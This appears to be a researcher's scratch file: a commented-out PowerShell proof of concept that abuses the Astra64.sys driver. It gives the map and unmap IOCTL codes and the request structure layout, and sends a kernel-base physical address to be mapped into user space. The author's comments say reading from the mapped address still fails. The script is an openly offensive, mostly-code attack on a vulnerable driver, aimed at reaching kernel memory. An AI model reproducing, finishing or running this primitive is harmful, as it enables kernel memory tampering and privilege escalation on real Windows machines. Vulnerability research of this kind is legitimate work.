Astra64.sys

// Return valid user address
// But ise fail when read from address
// Maybe because of VA -> Dword ?
// *(_DWORD *)a1 = (_DWORD)BaseAddress;

/*
Clear-Host
Write-Host

# --- Configuration ---
$StructSize        = 24
$IOCTL_ASTRA_MAP   = 0x80002008
$IOCTL_ASTRA_UNMAP = 0x8000200C

# 1. Allocate memory for the ASTRA_REQS structure
# Offset details: 
# [0] InterfaceType (4), [4] BusNumber (4), [8] PhysicalAddr (8), 
# [16] ViewSizeHigh (4), [20] ViewSizeLow (4)
$StructPtr = New-IntPtr -Size $StructSize
$va = Get-KernelBaseAddress
$pa = Convert-VirtualToPhysical -VirtualAddress $va

try {
    # Set fields
    [Marshal]::WriteInt32($StructPtr, 0, 1)        # InterfaceType = 1
    [Marshal]::WriteInt32($StructPtr, 4, 0)        # BusNumber = 0
    [Marshal]::WriteInt64($StructPtr, 8, $pa)      # PhysicalAddr = 0x100000
    [Marshal]::WriteInt32($StructPtr, 16, 0)       # ViewSizeHigh = 0
    [Marshal]::WriteInt32($StructPtr, 20, 0x1000)  # ViewSizeLow = 0x1000

    $hDevice = Get-FileHandle -FileName 'Astra64' -AlternativeName 'Astra32Device15' -Symbolic 'Device'
    if ($hDevice -eq $null -or $hDevice -eq 0) { throw "Fail to Get Device Handle" }

    # 2. STAGE 1: MAP
    $BytesReturned = New-IntPtr -Size 8
    if ($NtApi::DeviceIoControl($hDevice, $IOCTL_ASTRA_MAP, $StructPtr, $StructSize, $StructPtr, $StructSize, $BytesReturned, [IntPtr]::Zero)) {
        
        # Read the Mapped Virtual Address (The driver returns this at the beginning of the buffer)
        $MappedAddr = [Marshal]::ReadIntPtr($StructPtr)
        Write-Host "[+] Mapped to Virtual Address: 0x$($MappedAddr.ToString('X'))"

        Dump-MemoryAddress $StructPtr -Length 24

        # Read the byte at that location (Using ReadByte on the returned pointer)
        #$val = [Marshal]::ReadByte($MappedAddr)
        #Write-Host "[*] Value at physical address: 0x$($val.ToString('X2'))"
        
        # 3. STAGE 2: UNMAP
        if ($NtApi::DeviceIoControl($hDevice, $IOCTL_ASTRA_UNMAP, $StructPtr, $StructSize, [IntPtr]::Zero, 0, $BytesReturned, [IntPtr]::Zero)) {
            Write-Host "[+] Successfully unmapped view and freed kernel pool memory."
        }
    }
} finally {
    if ($StructPtr -ne [IntPtr]::Zero) { [Marshal]::FreeHGlobal($StructPtr) }
    if ($hDevice -ne $null) { Free-IntPtr -handle $hDevice -Method NtHandle }
}
*/